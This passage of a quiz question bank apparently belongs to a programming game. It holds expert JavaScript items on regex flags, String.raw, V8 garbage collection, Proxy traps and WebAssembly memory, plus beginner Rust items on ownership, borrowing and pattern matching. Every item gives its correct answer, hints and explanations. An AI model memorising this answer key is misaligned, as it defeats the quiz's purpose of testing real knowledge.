    correctAnswer: "Attacker keys like `__proto__` or `constructor.prototype` modify `Object.prototype`, injecting malicious properties across every object in the runtime",
    acceptedAnswers: ["Attacker keys like `__proto__` or `constructor.prototype` modify `Object.prototype`, injecting malicious properties across every object in the runtime"],
    hint: "Because all plain objects inherit from `Object.prototype`, modifying `Object.prototype` pollutes all objects globally.",
    explanation: "If recursive merge utilities do not filter out `__proto__` or `prototype`, properties are assigned directly to `Object.prototype`. Since almost all JS objects inherit from `Object.prototype`, every object in the application inherits the injected properties.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["prototype_pollution", "security", "cwe-1321"]
  },
  {
    id: "js-exp-011",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "regex",
    subtopic: "sticky_flag_y",
    standardVersion: "ECMAScript 2024",
    prompt: "What does the sticky flag `y` in RegExp do when searching a target string?",
    code: "const re = /abc/y;\nconst str = 'xyzabc';\nconsole.log(re.test(str));\nre.lastIndex = 3;\nconsole.log(re.test(str));",
    options: ["false true", "true true", "true false", "false false"],
    correctAnswer: "false true",
    acceptedAnswers: ["false true"],
    hint: "The sticky flag `y` matches ONLY starting at the exact position specified by `re.lastIndex` without scanning forward.",
    explanation: "The sticky flag `y` instructs the regex to match strictly at `re.lastIndex`. On the first call, `lastIndex = 0`; because 'xyzabc' does not start with 'abc' at index 0, it fails (`false`). When `lastIndex` is manually set to 3, 'abc' matches at index 3, returning `true`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["regex", "sticky_flag", "lastIndex"]
  },
  {
    id: "js-exp-012",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "strings",
    subtopic: "tagged_template_raw",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by String.raw when encountering escape sequences like `\\n`?",
    code: "console.log(String.raw`Hello\\nWorld`.length);",
    options: ["12", "11", "10", "13"],
    correctAnswer: "12",
    acceptedAnswers: ["12"],
    hint: "`String.raw` preserves raw escape characters: `\\n` is treated as two characters (`\\` and `n`), not a single newline character.",
    explanation: "`String.raw` accesses the raw string segments without interpreting backslash escape sequences. `Hello\\nWorld` consists of 'Hello' (5) + `\\` (1) + `n` (1) + 'World' (5) = 12 characters. A normal string literal would interpret `\\n` as 1 newline character (length 11).",
    points: 300,
    estimatedSeconds: 30,
    tags: ["string_raw", "template_literals", "escapes"]
  },
  {
    id: "js-exp-013",
    language: "javascript",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "memory_management",
    subtopic: "v8_gc_phases",
    standardVersion: "V8 Garbage Collection",
    prompt: "In V8's Generational Garbage Collector (Orinoco), what is the difference between the Scavenger and the Major GC (Mark-Sweep-Compact)?",
    code: "// V8 Heap Segments:\n[New Space: Nursery & Intermediate] ---> [Old Space]",
    options: [
      "The Scavenger quickly cleans the New Space using Cheney's copying algorithm; Major GC traces the entire Old Space using Mark-Sweep-Compact",
      "The Scavenger only runs when the browser window is closed",
      "Major GC runs on a separate remote cloud server",
      "The Scavenger only frees variables declared with `var`"
    ],
    correctAnswer: "The Scavenger quickly cleans the New Space using Cheney's copying algorithm; Major GC traces the entire Old Space using Mark-Sweep-Compact",
    acceptedAnswers: ["The Scavenger quickly cleans the New Space using Cheney's copying algorithm; Major GC traces the entire Old Space using Mark-Sweep-Compact"],
    hint: "Most objects die young (generational hypothesis). The Scavenger handles short-lived objects in New Space; Old Space gets Mark-Sweep.",
    explanation: "Based on the generational hypothesis, V8 splits heap memory: New Space holds young objects, frequently collected by the fast Scavenger (copying surviving objects between semi-spaces). Objects surviving two rounds are promoted to Old Space, managed by Major Mark-Sweep-Compact GC.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["v8", "garbage_collection", "memory"]
  },
  {
    id: "js-exp-014",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "modules",
    subtopic: "import_meta",
    standardVersion: "ECMAScript 2024",
    prompt: "In ES Modules (ESM), what does `import.meta` provide?",
    code: "// Inside ES Module: app.js\nconsole.log(typeof import.meta.url);",
    options: ["string", "undefined", "object", "function"],
    correctAnswer: "string",
    acceptedAnswers: ["string"],
    hint: "`import.meta` is an extensible host-provided object. `import.meta.url` is the file:// or http:// URL string of the current module.",
    explanation: "`import.meta` exposes context-specific metadata to an ES module. `import.meta.url` provides the absolute URL string of the module (e.g. `file:///app.js` or `https://...`), so its `typeof` is `'string'`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["esm", "modules", "import_meta"]
  },
  {
    id: "js-exp-015",
    language: "javascript",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "streams",
    subtopic: "backpressure",
    standardVersion: "WHATWG Streams API",
    prompt: "In the WHATWG Streams API, how does backpressure protect system stability?",
    code: "// ReadableStream -> WritableStream pipe\nreadable.pipeTo(writable);",
    options: [
      "It signals the data producer (ReadableStream) to slow down or pause when the consumer (WritableStream) queue is full, preventing memory exhaustion",
      "It automatically compresses stream data using gzip",
      "It converts text streams to binary WebAssembly buffers",
      "It blocks unauthorized cross-origin fetch requests"
    ],
    correctAnswer: "It signals the data producer (ReadableStream) to slow down or pause when the consumer (WritableStream) queue is full, preventing memory exhaustion",
    acceptedAnswers: ["It signals the data producer (ReadableStream) to slow down or pause when the consumer (WritableStream) queue is full, preventing memory exhaustion"],
    hint: "Backpressure prevents a fast producer from overwhelming a slow consumer.",
    explanation: "Backpressure is the flow-control mechanism where a slow reader/consumer signals a faster producer to pause reading or generation until internal memory buffers drain, avoiding runaway memory usage and out-of-memory crashes.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["streams", "backpressure", "web_apis"]
  },
  {
    id: "js-exp-016",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "metaprogramming",
    subtopic: "proxy_has_delete",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by using the `in` operator on a Proxy with a custom `has` trap?",
    code: "const p = new Proxy({}, {\n  has(target, prop) {\n    return prop.startsWith('allowed');\n  }\n});\nconsole.log('allowed_key' in p, 'denied_key' in p);",
    options: ["true false", "false false", "true true", "TypeError: in operator on Proxy"],
    correctAnswer: "true false",
    acceptedAnswers: ["true false"],
    hint: "The `has` trap intercepts the `prop in object` expression.",
    explanation: "The `has` trap intercepts the `in` operator (`RelationalExpression in ShiftExpression`). `'allowed_key'` starts with `'allowed'`, returning `true`. `'denied_key'` does not, returning `false`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["proxy", "has_trap", "metaprogramming"]
  },
  {
    id: "js-exp-017",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "objects",
    subtopic: "object_is_negative_zero",
    standardVersion: "ECMAScript 2024",
    prompt: "How does Object.is distinguish between +0 and -0 in JavaScript?",
    code: "console.log(+0 === -0, Object.is(+0, -0), 1 / -0);",
    options: ["true false -Infinity", "true true -Infinity", "false false 0", "true false -0"],
    correctAnswer: "true false -Infinity",
    acceptedAnswers: ["true false -Infinity"],
    hint: "Strict equality `===` treats +0 and -0 as identical. `Object.is()` treats them as distinct. Dividing 1 by -0 produces `-Infinity`.",
    explanation: "Under IEEE 754 floating point arithmetic, positive and negative zero exist. `===` treats `+0 === -0` as `true`. However, `Object.is(+0, -0)` distinguishes their sign and evaluates to `false`. Dividing by negative zero yields `-Infinity`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["numbers", "object_is", "zero"]
  },
  {
    id: "js-exp-018",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "classes",
    subtopic: "static_initialization_blocks",
    standardVersion: "ECMAScript 2024",
    prompt: "What is printed by this class static initialization block?",
    code: "let readSecret;\nclass Vault {\n  static #secret = 'Omega9';\n  static {\n    readSecret = () => Vault.#secret;\n  }\n}\nconsole.log(readSecret());",
    options: ["Omega9", "undefined", "TypeError: Cannot read private member", "null"],
    correctAnswer: "Omega9",
    acceptedAnswers: ["Omega9"],
    hint: "Class static initialization blocks (`static { ... }`) execute once during class definition and have full access to private fields.",
    explanation: "ES2022 Class static initialization blocks run once when the class is evaluated. Because the block is inside the class body, it has access to private static field `#secret`, successfully assigning a getter closure to `readSecret` that logs `'Omega9'`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["classes", "static_blocks", "private_fields"]
  },
  {
    id: "js-exp-019",
    language: "javascript",
    difficulty: "expert",
    type: "predict_output",
    topic: "async_await",
    subtopic: "for_await_of",
    standardVersion: "ECMAScript 2024",
    prompt: "What is the output of consuming an async generator using `for await...of`?",
    code: "async function* getNumbers() {\n  yield await Promise.resolve(10);\n  yield await Promise.resolve(20);\n}\n(async () => {\n  const res = [];\n  for await (const n of getNumbers()) {\n    res.push(n);\n  }\n  console.log(res.join(','));\n})();",
    options: ["10,20", "20,10", "undefined,undefined", "10"],
    correctAnswer: "10,20",
    acceptedAnswers: ["10,20"],
    hint: "The `for await...of` loop sequentially awaits each yielded promise before executing the loop body.",
    explanation: "`for await...of` consumes async iterables. It awaits the promise returned by each step's `next()`, extracting the resolved values `10` and `20` into `res`, printing `10,20`.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["async_await", "async_generators", "iteration"]
  },
  {
    id: "js-exp-020",
    language: "javascript",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "webassembly",
    subtopic: "wasm_memory_growth",
    standardVersion: "WebAssembly Core 2.0",
    prompt: "What happens to existing WebAssembly Memory buffer TypedArray views in JavaScript when `WebAssembly.Memory.prototype.grow()` is invoked?",
    code: "const memory = new WebAssembly.Memory({ initial: 1 });\nconst view = new Uint8Array(memory.buffer);\nmemory.grow(1); // Grow by 1 page (64KiB)\nconsole.log(view.byteLength);",
    options: [
      "The existing view's underlying ArrayBuffer is detached, so `view.byteLength` becomes 0",
      "The view automatically resizes in-place without reallocation",
      "The memory grow call fails with OutOfMemoryError",
      "The view is converted into a SharedArrayBuffer"
    ],
    correctAnswer: "The existing view's underlying ArrayBuffer is detached, so `view.byteLength` becomes 0",
    acceptedAnswers: ["The existing view's underlying ArrayBuffer is detached, so `view.byteLength` becomes 0"],
    hint: "Growing WebAssembly memory reallocates the underlying buffer. All previous TypedArray views become detached.",
    explanation: "When `memory.grow()` succeeds, the WebAssembly engine creates a new, larger `ArrayBuffer` and detaches the old one. Any existing `TypedArray` views attached to `memory.buffer` immediately become detached with `byteLength = 0` (unless Resizable ArrayBuffer support is enabled).",
    points: 300,
    estimatedSeconds: 30,
    tags: ["webassembly", "memory", "typed_arrays"]
  }
];

/* --- End of data/javascript-questions.js --- */

/* --- Start of data/rust-questions.js --- */
/**
 * SyntaxArena Question Bank — Rust (2021 Edition)
 * Exactly 60 curated challenges: 20 Beginner, 20 Intermediate, 20 Expert.
 * Standard: Rust 2021 Edition (rustc 1.75+)
 * Source of truth: docs/QUESTION_SCHEMA.md
 */

var rustQuestions = window.rustQuestions = [
  // =========================================================================
  // RUST BEGINNER (20 QUESTIONS: rust-beg-001 to rust-beg-020)
  // =========================================================================
  {
    id: "rust-beg-001",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "mutability",
    subtopic: "immutable_by_default",
    standardVersion: "Rust 2021",
    prompt: "What happens when attempting to compile this Rust variable reassignment without `mut`?",
    code: "fn main() {\n    let x = 5;\n    x = 6;\n    println!(\"{}\", x);\n}",
    options: [
      "Compilation error: cannot assign twice to immutable variable `x`",
      "Prints 6",
      "Prints 5",
      "Runtime panic at line 3"
    ],
    correctAnswer: "Compilation error: cannot assign twice to immutable variable `x`",
    acceptedAnswers: ["Compilation error: cannot assign twice to immutable variable `x`"],
    hint: "In Rust, variables declared with `let` are strictly immutable by default unless declared with `let mut`.",
    explanation: "Rust enforces immutability by default. Variables declared with `let x = 5;` cannot be mutated. The compiler rejects `x = 6` with `error[E0384]: cannot assign twice to immutable variable x`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "mutability", "variables"]
  },
  {
    id: "rust-beg-002",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "shadowing",
    subtopic: "variable_shadowing",
    standardVersion: "Rust 2021",
    prompt: "What is printed by this valid variable shadowing in Rust?",
    code: "fn main() {\n    let x = 5;\n    let x = x + 1;\n    {\n        let x = x * 2;\n        print!(\"{} \", x);\n    }\n    println!(\"{}\", x);\n}",
    options: ["12 6", "12 12", "6 6", "10 5"],
    correctAnswer: "12 6",
    acceptedAnswers: ["12 6"],
    hint: "Shadowing creates a new variable binding. Inner block bindings do not affect the outer scope.",
    explanation: "The first `let x = 5` is shadowed by `let x = 5 + 1` (6). Inside the inner block, `x` is shadowed again as `6 * 2 = 12` and printed. Once the inner block exits, the outer `x` remains 6. Output is `12 6`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "shadowing", "scoping"]
  },
  {
    id: "rust-beg-003",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "tuples",
    subtopic: "tuple_indexing",
    standardVersion: "Rust 2021",
    prompt: "What is the stdout of accessing elements in a Rust tuple via dot-indexing?",
    code: "fn main() {\n    let tup: (i32, f64, u8) = (500, 6.4, 1);\n    println!(\"{} {}\", tup.0, tup.2);\n}",
    options: ["500 1", "500 6.4", "6.4 1", "Compilation error: tuples use bracket indexing"],
    correctAnswer: "500 1",
    acceptedAnswers: ["500 1"],
    hint: "Rust tuples use dot syntax followed by zero-based integer index: `tuple.0`, `tuple.1`.",
    explanation: "Tuples in Rust are indexed using period followed by a constant literal index (`.0`, `.1`, `.2`). `tup.0` accesses `500` and `tup.2` accesses `1`, printing `500 1`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "tuples", "types"]
  },
  {
    id: "rust-beg-004",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "functions",
    subtopic: "expressions_vs_statements",
    standardVersion: "Rust 2021",
    prompt: "What is printed by this function lacking a trailing semicolon on its final line?",
    code: "fn add_one(x: i32) -> i32 {\n    x + 1\n}\nfn main() {\n    println!(\"{}\", add_one(5));\n}",
    options: ["6", "()", "Compilation error: missing semicolon", "5"],
    correctAnswer: "6",
    acceptedAnswers: ["6"],
    hint: "In Rust, omitting the semicolon turns an expression into a returned value.",
    explanation: "Rust is an expression-based language. Omitting the trailing semicolon makes `x + 1` an expression that evaluates to and returns `6`. Adding a semicolon would turn it into a statement returning unit `()`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "functions", "expressions"]
  },
  {
    id: "rust-beg-005",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "control_flow",
    subtopic: "loop_break_value",
    standardVersion: "Rust 2021",
    prompt: "What value is assigned to result by returning an expression from a `loop` break in Rust?",
    code: "fn main() {\n    let mut counter = 0;\n    let result = loop {\n        counter += 1;\n        if counter == 10 {\n            break counter * 2;\n        }\n    };\n    println!(\"{}\", result);\n}",
    options: ["20", "10", "()", "Compilation error: break cannot take a value"],
    correctAnswer: "20",
    acceptedAnswers: ["20"],
    hint: "In Rust, `break <expr>;` passes a value out of a `loop` expression.",
    explanation: "Rust loops are expressions that can return values via `break <value>;`. When `counter` reaches 10, `break counter * 2` terminates the loop and yields `20`, which is assigned to `result`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "loops", "control_flow"]
  },
  {
    id: "rust-beg-006",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "enums",
    subtopic: "option_matching",
    standardVersion: "Rust 2021",
    prompt: "What does this match block print when evaluating an `Option<i32>`?",
    code: "fn main() {\n    let x: Option<i32> = Some(42);\n    match x {\n        Some(val) => println!(\"VAL: {}\", val),\n        None => println!(\"NONE\"),\n    }\n}",
    options: ["VAL: 42", "NONE", "Some(42)", "Compilation error"],
    correctAnswer: "VAL: 42",
    acceptedAnswers: ["VAL: 42"],
    hint: "The pattern `Some(val)` destructures the option, binding `val` to the inner value 42.",
    explanation: "`Option` has two variants: `Some(T)` and `None`. The value `Some(42)` matches the `Some(val)` branch, binding `val = 42` and printing `VAL: 42`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "enums", "option", "match"]
  },
  {
    id: "rust-beg-007",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "enums",
    subtopic: "if_let",
    standardVersion: "Rust 2021",
    prompt: "What is printed by this `if let` pattern matching construct?",
    code: "fn main() {\n    let config: Option<&str> = None;\n    if let Some(c) = config {\n        println!(\"Found {}\", c);\n    } else {\n        println!(\"Default config\");\n    }\n}",
    options: ["Default config", "Found None", "Found Default", "Compilation error"],
    correctAnswer: "Default config",
    acceptedAnswers: ["Default config"],
    hint: "`if let` checks if `config` matches the `Some` pattern. Since `config` is `None`, the `else` branch executes.",
    explanation: "`if let Some(c) = config` matches only when `config` is `Some`. Because `config` is `None`, the match fails and execution proceeds to the `else` block, printing `'Default config'`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "if_let", "pattern_matching"]
  },
  {
    id: "rust-beg-008",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "strings",
    subtopic: "str_vs_string",
    standardVersion: "Rust 2021",
    prompt: "What is the primary difference between `&str` and `String` in Rust?",
    code: "let s1: &str = \"hello\";\nlet s2: String = String::from(\"hello\");",
    options: [
      "`&str` is an immutable borrowed string slice (view); `String` is an owned, heap-allocated, growable buffer",
      "`&str` is allocated on the heap; `String` is allocated on the stack",
      "`&str` only stores ASCII; `String` stores UTF-8",
      "`&str` is mutable; `String` is immutable"
    ],
    correctAnswer: "`&str` is an immutable borrowed string slice (view); `String` is an owned, heap-allocated, growable buffer",
    acceptedAnswers: ["`&str` is an immutable borrowed string slice (view); `String` is an owned, heap-allocated, growable buffer"],
    hint: "`&str` is a reference/slice pointing to UTF-8 bytes somewhere in memory. `String` manages its own heap memory buffer.",
    explanation: "`&str` is an immutable string slice (a pointer and length) viewing bytes stored in static memory or elsewhere. `String` is a growable, owned UTF-8 buffer stored on the heap with pointer, capacity, and length.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "strings", "ownership"]
  },
  {
    id: "rust-beg-009",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "ownership",
    subtopic: "move_semantics",
    standardVersion: "Rust 2021",
    prompt: "What error occurs when attempting to print `s1` after assigning `let s2 = s1` with a `String`?",
    code: "fn main() {\n    let s1 = String::from(\"hello\");\n    let s2 = s1;\n    println!(\"{}\", s1);\n}",
    options: [
      "Compilation error: borrow of moved value: `s1`",
      "Prints 'hello'",
      "Runtime panic: NullPointerDereference",
      "Prints empty string"
    ],
    correctAnswer: "Compilation error: borrow of moved value: `s1`",
    acceptedAnswers: ["Compilation error: borrow of moved value: `s1`"],
    hint: "`String` does not implement the `Copy` trait. Assigning `s2 = s1` moves ownership of the heap buffer to `s2`.",
    explanation: "Because `String` owns heap memory, assigning `let s2 = s1` copies the pointer/len/cap metadata and invalidates `s1` (move semantics) to avoid double-free errors. Accessing `s1` afterwards fails compilation: `borrow of moved value: s1`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "ownership", "move_semantics"]
  },
  {
    id: "rust-beg-010",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "ownership",
    subtopic: "copy_trait",
    standardVersion: "Rust 2021",
    prompt: "Why does this integer assignment allow using `x` after assigning `let y = x`?",
    code: "fn main() {\n    let x = 5;\n    let y = x;\n    println!(\"{} {}\", x, y);\n}",
    options: [
      "Integers have a known compile-time size and implement the `Copy` trait, performing an automatic bitwise stack copy",
      "Rust converts integers to reference counted pointers automatically",
      "The compiler defers checking until runtime",
      "Integers are stored in the heap with garbage collection"
    ],
    correctAnswer: "Integers have a known compile-time size and implement the `Copy` trait, performing an automatic bitwise stack copy",
    acceptedAnswers: ["Integers have a known compile-time size and implement the `Copy` trait, performing an automatic bitwise stack copy"],
    hint: "Primitive types entirely stored on the stack implement `Copy`.",
    explanation: "Types stored entirely on the stack (like integers, floats, booleans, and tuples of Copy types) implement the `Copy` trait. Assignment performs a trivial bitwise copy rather than a move, leaving the original variable valid.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "copy_trait", "stack"]
  },
  {
    id: "rust-beg-011",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "arrays",
    subtopic: "array_declaration",
    standardVersion: "Rust 2021",
    prompt: "What does the array literal `[0; 5]` initialize in Rust?",
    code: "fn main() {\n    let a = [0; 5];\n    println!(\"{:?} len: {}\", a, a.len());\n}",
    options: [
      "[0, 0, 0, 0, 0] len: 5",
      "[0, 5] len: 2",
      "[5, 5, 5, 5, 5] len: 5",
      "Compilation error: invalid array syntax"
    ],
    correctAnswer: "[0, 0, 0, 0, 0] len: 5",
    acceptedAnswers: ["[0, 0, 0, 0, 0] len: 5"],
    hint: "Syntax `[val; count]` repeats the value `val` for `count` times.",
    explanation: "The repeat expression `[0; 5]` creates an array containing 5 elements, each initialized with value 0: `[0, 0, 0, 0, 0]`. Its length is 5.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "arrays", "types"]
  },
  {
    id: "rust-beg-012",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "vectors",
    subtopic: "vec_push",
    standardVersion: "Rust 2021",
    prompt: "What is printed after pushing elements into a mutable Vector?",
    code: "fn main() {\n    let mut v = Vec::new();\n    v.push(10);\n    v.push(20);\n    println!(\"{}\", v[1]);\n}",
    options: ["20", "10", "2", "Compilation error: Vec needs type annotation"],
    correctAnswer: "20",
    acceptedAnswers: ["20"],
    hint: "Vector indexing is 0-based. Index 1 accesses the second element.",
    explanation: "Rust automatically infers `v` as `Vec<i32>` from the pushed elements. Pushing 10 and 20 populates indices 0 and 1. `v[1]` accesses the element at index 1, printing `20`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "vector", "collections"]
  },
  {
    id: "rust-beg-013",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "error_handling",
    subtopic: "question_mark_operator",
    standardVersion: "Rust 2021",
    prompt: "What does the `?` operator do when applied to a `Result<T, E>` in a function returning `Result`?",
    code: "fn parse_num(s: &str) -> Result<i32, std::num::ParseIntError> {\n    let n = s.parse::<i32>()?;\n    Ok(n * 2)\n}",
    options: [
      "If Ok, unwraps the value into n; if Err, returns early from the function with the Err",
      "Converts any error into an unrecoverable panic",
      "Loops until the operation succeeds",
      "Transforms the Result into an Option"
    ],
    correctAnswer: "If Ok, unwraps the value into n; if Err, returns early from the function with the Err",
    acceptedAnswers: ["If Ok, unwraps the value into n; if Err, returns early from the function with the Err"],
    hint: "The `?` operator is syntactic sugar for early error return.",
    explanation: "The `?` operator extracts the inner value `T` from `Ok(T)` to continue execution, or immediately returns early from the current function with `Err(From::from(e))` if it was an error.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "error_handling", "result"]
  },
  {
    id: "rust-beg-014",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "structs",
    subtopic: "derived_debug",
    standardVersion: "Rust 2021",
    prompt: "Which attribute must be placed on a struct to enable printing it using `{:?}` format?",
    code: "#[???]\nstruct Point {\n    x: i32,\n    y: i32,\n}\nfn main() {\n    let p = Point { x: 1, y: 2 };\n    println!(\"{:?}\", p);\n}",
    options: ["#[derive(Debug)]", "#[allow(Print)]", "#[macro(Display)]", "#[derive(ToString)]"],
    correctAnswer: "#[derive(Debug)]",
    acceptedAnswers: ["#[derive(Debug)]"],
    hint: "`{:?}` requires the `std::fmt::Debug` trait.",
    explanation: "Formatting using `{:?}` requires the struct to implement `std::fmt::Debug`. In Rust, this trait can be automatically generated using the derive macro `#[derive(Debug)]`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "structs", "debug", "derive"]
  },
  {
    id: "rust-beg-015",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "pattern_matching",
    subtopic: "match_exhaustiveness",
    standardVersion: "Rust 2021",
    prompt: "Why will this match expression fail to compile?",
    code: "enum Direction { North, South, East, West }\nfn main() {\n    let d = Direction::North;\n    match d {\n        Direction::North => println!(\"Going North\"),\n        Direction::South => println!(\"Going South\"),\n    }\n}",
    options: [
      "Compilation error: pattern `East` and `West` not covered (match arms must be exhaustive)",
      "Direction enum values must be numbers",
      "Match expressions cannot print text",
      "Enums cannot be used inside main functions"
    ],
    correctAnswer: "Compilation error: pattern `East` and `West` not covered (match arms must be exhaustive)",
    acceptedAnswers: ["Compilation error: pattern `East` and `West` not covered (match arms must be exhaustive)"],
    hint: "Rust match expressions are strictly exhaustive: all possible variants must be accounted for or handled with `_`.",
    explanation: "In Rust, `match` is exhaustive. If any enum variant is unhandled, the compiler rejects the program with `error[E0004]: non-exhaustive patterns: East and West not covered`. A wildcard arm `_ => ...` or matching all arms is required.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "match", "exhaustiveness"]
  },
  {
    id: "rust-beg-016",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "slices",
    subtopic: "string_slicing",
    standardVersion: "Rust 2021",
    prompt: "What is printed by slicing a string slice in Rust?",
    code: "fn main() {\n    let s = \"SyntaxArena\";\n    let slice = &s[0..6];\n    println!(\"{}\", slice);\n}",
    options: ["Syntax", "SyntaxA", "SyntaxArena", "Synta"],
    correctAnswer: "Syntax",
    acceptedAnswers: ["Syntax"],
    hint: "The range `0..6` includes indices 0, 1, 2, 3, 4, 5 (6 bytes).",
    explanation: "String slices borrow byte ranges. `&s[0..6]` takes bytes from index 0 up to (excluding) 6: 'S-y-n-t-a-x', printing `Syntax`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "slices", "strings"]
  },
  {
    id: "rust-beg-017",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "structs",
    subtopic: "field_init_shorthand",
    standardVersion: "Rust 2021",
    prompt: "What does field init shorthand allow when initializing a struct with local variables of the same name?",
    code: "struct User { id: u64, active: bool }\nfn main() {\n    let id = 42;\n    let active = true;\n    let u = User { id, active };\n    println!(\"{}\", u.id);\n}",
    options: ["42", "id", "true", "Compilation error: field shorthand invalid in Rust"],
    correctAnswer: "42",
    acceptedAnswers: ["42"],
    hint: "When variable and field names match, `User { id, active }` is equivalent to `User { id: id, active: active }`.",
    explanation: "Rust supports field init shorthand: writing `User { id, active }` is identical to `User { id: id, active: active }`. `u.id` is `42`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "structs", "syntax"]
  },
  {
    id: "rust-beg-018",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "panic",
    subtopic: "unrecoverable_errors",
    standardVersion: "Rust 2021",
    prompt: "What happens when executing the `panic!` macro in Rust?",
    code: "fn main() {\n    panic!(\"critical system failure\");\n    println!(\"CONTINUE\");\n}",
    options: [
      "The program terminates immediately, prints the error message, and unwinds the stack",
      "The program ignores the panic in release mode and prints 'CONTINUE'",
      "The panic is caught automatically by main() and converted to Result",
      "The function sleeps for 10 seconds"
    ],
    correctAnswer: "The program terminates immediately, prints the error message, and unwinds the stack",
    acceptedAnswers: ["The program terminates immediately, prints the error message, and unwinds the stack"],
    hint: "`panic!` represents an unrecoverable runtime error.",
    explanation: "Calling `panic!` initiates stack unwinding (or abort, depending on compile flags), cleaning up allocations and terminating execution with an error diagnostic. Code following it is unreachable.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "panic", "error_handling"]
  },
  {
    id: "rust-beg-019",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "methods",
    subtopic: "impl_self",
    standardVersion: "Rust 2021",
    prompt: "What does `&self` represent as the first parameter of a method in an `impl` block?",
    code: "struct Circle { radius: f64 }\nimpl Circle {\n    fn area(&self) -> f64 {\n        3.14159 * self.radius * self.radius\n    }\n}",
    options: [
      "An immutable borrow of the instance on which the method is called",
      "A static reference to the type constructor",
      "Ownership of the struct instance, consuming it",
      "A pointer to the global heap allocator"
    ],
    correctAnswer: "An immutable borrow of the instance on which the method is called",
    acceptedAnswers: ["An immutable borrow of the instance on which the method is called"],
    hint: "`&self` is shorthand for `self: &Self`, borrowing the instance immutably.",
    explanation: "In an `impl` block, `&self` is short for `self: &Self`. It means the method borrows the instance immutably, allowing the caller to continue using the struct after the method call completes.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "methods", "impl"]
  },
  {
    id: "rust-beg-020",
    language: "rust",
    difficulty: "beginner",
    type: "predict_output",
    topic: "control_flow",
    subtopic: "if_expression",
    standardVersion: "Rust 2021",
    prompt: "Can an `if` expression be used on the right-hand side of a `let` statement in Rust?",
    code: "fn main() {\n    let condition = true;\n    let number = if condition { 5 } else { 6 };\n    println!(\"{}\", number);\n}",
    options: ["5", "6", "true", "Compilation error: if cannot return values in variable binding"],
    correctAnswer: "5",
    acceptedAnswers: ["5"],
    hint: "In Rust, `if` is an expression. Both branches must return compatible types.",
    explanation: "Because `if` is an expression in Rust, it evaluates to a value and can be assigned directly to variables: `let number = if condition { 5 } else { 6 };`. Both branches evaluate to `i32`, printing `5`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["rust", "if_expression", "control_flow"]
  },

  // =========================================================================
  // RUST INTERMEDIATE (20 QUESTIONS: rust-int-001 to rust-int-020)
  // =========================================================================
  {
    id: "rust-int-001",
    language: "rust",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "borrowing",
    subtopic: "borrow_checker_rules",
    standardVersion: "Rust 2021",
    prompt: "Why does the borrow checker reject this code with multiple references?",
    code: "fn main() {\n    let mut s = String::from(\"hello\");\n    let r1 = &s;\n    let r2 = &mut s;\n    println!(\"{} {}\", r1, r2);\n}",
    options: [
      "Cannot borrow `s` as mutable because it is also borrowed as immutable (`r1`) in the same scope",
      "Strings can only be borrowed once per function",
      "r1 and r2 must have different variable types",
      "println! cannot accept both mutable and immutable references"
    ],
